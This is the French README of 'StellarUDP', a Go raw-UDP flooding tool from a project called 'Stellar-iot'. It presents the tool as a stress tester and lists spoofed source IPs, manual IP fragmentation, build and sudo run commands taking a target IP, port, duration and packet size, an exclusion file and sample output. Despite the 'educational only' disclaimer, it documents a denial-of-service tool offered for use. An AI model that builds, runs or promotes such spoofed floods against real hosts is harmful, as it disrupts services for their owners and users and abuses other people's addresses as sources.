🚀 StellarUDP – Raw UDP Flooder avec Fragmentation IP Manuelle

    Coded by: StellarBots123
    Projet: Stellar-iot
    Nom du fichier: flood.go
    Usage réservé à des fins éducatives ⚠️

🧠 Description

StellarUDP est un outil de stress-test réseau écrit en Go, qui génère un flux de paquets UDP avec IP spoofées et fragmentation manuelle au niveau IP.
Il utilise un bloc CIDR basé sur ton IP publique (via ipinfo.io) pour générer un ensemble réaliste d'IP sources, et permet d'exclure certaines adresses à l’aide d’un fichier exclude.txt.
🛠 Fonctionnalités

    📦 Fragmentation IP manuelle (supporte MTU < 1500)

    🔥 Envoi massif de paquets UDP avec spoof IP

    🌐 Récupération automatique du CIDR de l'IP publique

    🔒 Exclusion d'IP via exclude.txt

    🎯 Personnalisation complète : IP cible, port, durée, taille du paquet

⚙️ Compilation

go build -o flood flood.go

🚀 Utilisation

sudo ./flood <IP_CIBLE> <PORT> <DUREE_SECONDES> <TAILLE_PACKET>

Exemple :

sudo ./flood 192.168.1.100 80 60 4096

    IP_CIBLE : adresse IP de la cible

    PORT : port UDP de destination

    DUREE_SECONDES : durée de l’envoi en secondes

    TAILLE_PACKET : taille totale du payload UDP (jusqu'à 65507 octets)

📁 Fichier exclude.txt

Permet d’exclure certaines adresses IP du spoof (exemple : ton routeur, ton IP publique, etc.)

Exemple :

192.168.1.1
192.168.1.254
203.0.113.50

🧪 Exemple de sortie

[+] Flood Tool by StellarBots123
[-] Disclaimer: This tool is intended for educational purposes only. Use responsibly and legally.
[+] IP externe: 203.0.113.10
[+] CIDR: 203.0.113.0/24
[+] IPs exclues chargées: 3
[+] Cible : 192.168.1.100
[+] Port : 80
[+] Durée : 60 secondes
[+] Taille paquet : 4096
[+] Génération du bloc basé sur le CIDR...
[+] Bloc généré avec 251 IP spoofées.
[+] Terminé après 60 secondes.

⚠️ Avertissement légal

Ce logiciel est fourni à des fins éducatives et de test uniquement.
Toute utilisation non autorisée ou malveillante est strictement interdite.
L’auteur ne peut être tenu responsable de l’usage que vous en faites.

🧑‍💻 Auteur

StellarBots123
Projet : Stellar-iot
Langage : Go
Date : 2025
